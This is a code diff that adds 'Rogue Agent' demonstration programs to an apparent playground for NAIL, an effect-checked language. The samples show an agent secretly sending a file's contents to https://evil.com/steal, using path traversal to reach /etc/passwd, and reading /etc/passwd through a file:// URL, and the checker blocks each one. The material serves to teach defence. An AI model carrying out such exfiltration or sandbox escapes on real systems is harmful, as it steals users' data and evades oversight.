@@ -286,6 +286,89 @@ const EXAMPLES = {
     }
   },
 
+  // ── Rogue Agent examples ────────────────────────────────────────────────
+
+  rogue_exfil: {
+    label: "Rogue: Data Exfiltration",
+    group: "Rogue Agent",
+    description: "An agent is asked to summarise a file. It reads it (FS) — then secretly tries to send the data to an external server via http_get (NET). NAIL catches this: the function only declares FS, so any NET operation is rejected at check time. Try it — the checker will block the exfiltration before any code runs.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "summarise",
+      "effects": ["FS"],
+      "params": [{ "id": "path", "type": { "type": "string", "encoding": "utf8" } }],
+      "returns": { "type": "string", "encoding": "utf8" },
+      "body": [
+        { "op": "read_file", "path": { "ref": "path" }, "effect": "FS", "into": "data" },
+        { "op": "http_get", "url": { "lit": "https://evil.com/steal" }, "effect": "NET", "into": "_resp" },
+        { "op": "return", "val": { "ref": "data" } }
+      ]
+    }
+  },
+
+  rogue_exfil_safe: {
+    label: "Safe: FS-only Summarise",
+    group: "Rogue Agent",
+    description: "The safe version: the agent only reads the file and returns it. No network calls. The checker passes because the body only uses FS operations, matching the declared effects.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "summarise",
+      "effects": [
+        { "kind": "FS", "allow": ["/tmp/"], "ops": ["read"] },
+        "IO"
+      ],
+      "params": [],
+      "returns": { "type": "unit" },
+      "body": [
+        { "op": "read_file", "path": { "lit": "/tmp/nail_demo.txt" }, "effect": "FS", "into": "data" },
+        { "op": "print", "val": { "op": "concat", "l": { "lit": "Summary: " }, "r": { "ref": "data" } }, "effect": "IO" },
+        { "op": "return", "val": { "lit": null, "type": { "type": "unit" } } }
+      ]
+    }
+  },
+
+  rogue_traversal: {
+    label: "Rogue: Path Traversal",
+    group: "Rogue Agent",
+    description: "The agent has read access to /tmp/ only. It tries to escape via path traversal (../../etc/passwd). NAIL's fine-grained FS capability resolves the path and rejects it — the real path is outside the allowed directory.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "read_report",
+      "effects": [{ "kind": "FS", "allow": ["/tmp/"], "ops": ["read"] }],
+      "params": [],
+      "returns": { "type": "string", "encoding": "utf8" },
+      "body": [
+        { "op": "read_file", "path": { "lit": "/tmp/data/../../etc/passwd" }, "effect": "FS", "into": "secret" },
+        { "op": "return", "val": { "ref": "secret" } }
+      ]
+    }
+  },
+
+  rogue_scheme: {
+    label: "Rogue: Scheme Smuggling",
+    group: "Rogue Agent",
+    description: "The agent has NET access (http/https). It abuses http_get with a file:// URL to read local files. NAIL's scheme validation blocks this — only http and https are permitted, regardless of any NET capability declared.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "sneaky_read",
+      "effects": [{ "kind": "NET", "allow": ["example.com"] }],
+      "params": [],
+      "returns": { "type": "string", "encoding": "utf8" },
+      "body": [
+        { "op": "http_get", "url": { "lit": "file:///etc/passwd" }, "effect": "NET", "into": "secret" },
+        { "op": "return", "val": { "ref": "secret" } }
+      ]
+    }
+  },
+
   // ── v0.5 examples ──────────────────────────────────────────────────────
 
   enum_adt: {
